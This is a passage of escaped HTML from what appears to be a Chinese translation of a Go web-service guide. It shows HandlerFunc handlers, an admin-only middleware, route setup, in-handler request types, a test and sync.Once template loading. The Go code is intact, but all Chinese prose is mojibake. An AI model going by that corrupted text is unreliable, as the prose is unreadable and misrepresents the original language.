&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="ä½¿ç”¨-handlerfunc-è€Œé-handler">ä½¿ç”¨ HandlerFunc è€Œé Handler&lt;/h2>
&lt;p>æˆ‘å‡ ä¹åœ¨æ‰€æœ‰æƒ…å†µä¸‹éƒ½ä½¿ç”¨ &lt;code>http.HandlerFunc&lt;/code> ï¼Œè€Œé &lt;code>http.Handler&lt;/code> ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">handleSomething&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HandlerFunc&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ResponseWriter&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">r&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// ...
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¸¤è€…åŸºæœ¬ä¸Šæ˜¯å¯äº’æ¢çš„ï¼Œåªéœ€è¦é€‰ä¸€ä¸ªå¯è¯»æ€§æ›´å¼ºçš„å°±å¥½ã€‚å¯¹æˆ‘è€Œè¨€ï¼Œ &lt;code>http.HandlerFunc&lt;/code> ä¼šå¥½ç‚¹ã€‚&lt;/p>
&lt;h2 id="ä¸­é—´ä»¶å°±æ˜¯æ™®é€šçš„-go-å‡½æ•°">ä¸­é—´ä»¶å°±æ˜¯æ™®é€šçš„ Go å‡½æ•°&lt;/h2>
&lt;p>ä¸­é—´ä»¶å‡½æ•°æ¥å—ä¸€ä¸ª &lt;code>http.HandlerFunc&lt;/code> å‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–°çš„ &lt;code>http.HandlerFunc&lt;/code> ï¼Œæ–°çš„è¿™ä¸ª handler å¯ä»¥åœ¨è°ƒç”¨ä¼ å…¥çš„ handler ä¹‹å‰æˆ–ä¹‹åï¼Œæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©å®Œå…¨ä¸æ‰§è¡Œä¼ å…¥çš„ handlerã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">adminOnly&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">h&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HandlerFunc&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HandlerFunc&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ResponseWriter&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">r&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nf">currentUser&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">IsAdmin&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NotFound&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">r&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">h&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">r&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¸Šè¿°ä¾‹å­ä¸­ï¼Œå¦‚æœ &lt;code>IsAdmin&lt;/code> ä¸º falseï¼Œåˆ™è¿”å› 404 å¹¶ä¸”ç»ˆæ­¢å¤„ç†ã€‚æ³¨æ„è¿™ç§æƒ…å†µä¸‹ï¼Œä¼ å…¥çš„ h handler å¹¶æœªè¢«è°ƒç”¨ã€‚&lt;/p>
&lt;p>å¦‚æœ &lt;code>IsAdmin&lt;/code> ä¸º trueï¼Œåˆ™æ­£å¸¸èµ°ä¼ å…¥çš„ h handler é€»è¾‘ã€‚&lt;/p>
&lt;p>ä¸­é—´ä»¶ä¹Ÿå¯ä»¥åˆ—åœ¨ &lt;code>routes.go&lt;/code> ä¸­ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">package&lt;/span> &lt;span class="nx">app&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">routes&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">HandleFunc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/api/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">handleAPI&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">HandleFunc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/about&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">handleAbout&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">HandleFunc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">handleIndex&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">HandleFunc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/admin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">adminOnly&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">handleAdminIndex&lt;/span>&lt;span class="p">()))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="å°±åœ°å®šä¹‰è¯·æ±‚å’Œå“åº”ç±»å‹">å°±åœ°å®šä¹‰è¯·æ±‚å’Œå“åº”ç±»å‹&lt;/h2>
&lt;p>å¦‚æœä¸€ä¸ªç«¯ç‚¹ï¼ˆendpointï¼‰æœ‰è‡ªå·±çš„è¯·æ±‚ã€å“åº”ç±»å‹ï¼Œé€šå¸¸è¿™äº›ç±»å‹åªå¯¹æ”¹ handler æœ‰ç”¨ã€‚&lt;/p>
&lt;p>å¦‚æœç¡®å®å¦‚æ­¤ï¼Œåˆ™å¯ä»¥ç›´æ¥åœ¨å‡½æ•°å†…éƒ¨å®šä¹‰è¿™äº›ç±»å‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">handleSomething&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HandlerFunc&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">type&lt;/span> &lt;span class="nx">request&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Name&lt;/span> &lt;span class="kt">string&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">type&lt;/span> &lt;span class="nx">response&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Greeting&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="s">`json:&amp;#34;greeting&amp;#34;`&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ResponseWriter&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">r&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// ...
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¿™æ ·ä¸ä¼šæ±¡æŸ“ä½ çš„åŒ…å‘½åç©ºé—´ï¼Œå…è®¸ä½ åœ¨ä¸åŒçš„ handler ä¸­ä½¿ç”¨ç›¸åŒçš„åå­—ï¼Œè€Œéä¸ºæ¯ä¸ª handler æƒ³ä¸€ä¸ªä¸åŒçš„åå­—ã€‚&lt;/p>
&lt;p>åœ¨æµ‹è¯•ä»£ç ä¸­ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‹·è´è¿™äº›ç±»å‹å®šä¹‰åˆ°æµ‹è¯•å‡½æ•°ä¸­ã€‚&lt;/p>
&lt;h2 id="ç±»å‹å®šä¹‰å¯ä»¥å¸®åŠ©äººä»¬æ„é€ æµ‹è¯•ç”¨ä¾‹ä»¥åŠç†è§£ä»£ç ">ç±»å‹å®šä¹‰å¯ä»¥å¸®åŠ©äººä»¬æ„é€ æµ‹è¯•ç”¨ä¾‹ï¼Œä»¥åŠç†è§£ä»£ç &lt;/h2>
&lt;p>å¦‚æœä½ çš„è¯·æ±‚ã€å“åº”ç±»å‹éšè—åœ¨ handler å†…éƒ¨ï¼Œä½ å¯ä»¥åœ¨æµ‹è¯•ä»£ç ä¸­ç›´æ¥å®šä¹‰æ–°ç±»å‹ã€‚&lt;/p>
&lt;p>è¿™æ˜¯ä¸€ä¸ªè¡¨è¾¾ä½ çš„æ„å›¾ï¼Œæ–¹ä¾¿åäººç†è§£ä½ çš„ä»£ç çš„æœºä¼šã€‚&lt;/p>
&lt;p>ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ª &lt;code>Person&lt;/code> ç±»å‹ï¼Œåœ¨å¾ˆå¤šç«¯ç‚¹ï¼ˆendpointï¼‰ä¸­è¢«å¤ç”¨ã€‚å…¶ä¸­æœ‰ä¸€ä¸ª &lt;code>/greet&lt;/code> ç«¯ç‚¹ï¼Œæˆ‘ä»¬å¤§æ¦‚ç‡åªå…³å¿ƒ &lt;code>Person.name&lt;/code> è¿™ä¸ªå­—æ®µï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨æµ‹è¯•ä»£ç ä¸­è¡¨è¾¾è¿™ä¸€ç‚¹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">TestGreet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">testing&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">is&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">is&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">p&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Name&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="s">`json:&amp;#34;name&amp;#34;`&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Name&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;Mat Ryer&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">buf&lt;/span> &lt;span class="nx">bytes&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Buffer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">json&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewEncoder&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nf">Encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">is&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NoErr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// json.NewEncoder
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewRequest&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">MethodPost&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;/greet&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">is&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NoErr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// ... more test code here
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;p>ä»…ä»åŠŸèƒ½æµ‹è¯•è§’åº¦æ¥è®²ï¼Œè¿™ä¹ˆåšæ˜¯ OK çš„ï¼Œè¢«æµ‹ä»£ç çš„ç”¨æ³•ä¹Ÿè¡¨è¾¾çš„å¾ˆæ¸…æ¥šã€‚ä½†æ˜¯ä»é²æ£’æ€§æµ‹è¯•çš„è§’åº¦ï¼Œä¹Ÿè®¸éœ€è¦è€ƒè™‘åˆ°ä¼ é€’æ•´ä¸ªæ•°æ®ç»“æ„è¿›å»ï¼Œä¼šä¸ä¼šäº§ç”Ÿä»€ä¹ˆé—®é¢˜ï¼Ÿ&lt;/p>
&lt;/blockquote>
&lt;h2 id="åˆ©ç”¨-synconce-è®¾ç½®ä¾èµ–">åˆ©ç”¨ sync.Once è®¾ç½®ä¾èµ–&lt;/h2>
&lt;p>åœ¨å‡†å¤‡ handler çš„æ—¶å€™ï¼Œå¦‚æœéœ€è¦æ‰§è¡Œä¸€äº›æˆæœ¬æ¯”è¾ƒé«˜çš„åˆå§‹åŒ–æ“ä½œï¼Œå¯ä»¥è€ƒè™‘å°†è¯¥æ“ä½œå»¶è¿Ÿåˆ°è¯¥ handler ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨çš„æ—¶å€™ã€‚&lt;/p>
&lt;p>è¿™å¯ä»¥æ”¹å–„åº”ç”¨çš„å¯åŠ¨æ—¶é—´ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">handleTemplate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">files&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HandlerFunc&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">init&lt;/span> &lt;span class="nx">sync&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Once&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">tpl&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">template&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Template&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">tplerr&lt;/span> &lt;span class="kt">error&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ResponseWriter&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">r&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">init&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Do&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">tpl&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">tplerr&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">template&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ParseFiles&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">files&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nx">tplerr&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">tplerr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">StatusInternalServerError&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// use tpl
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
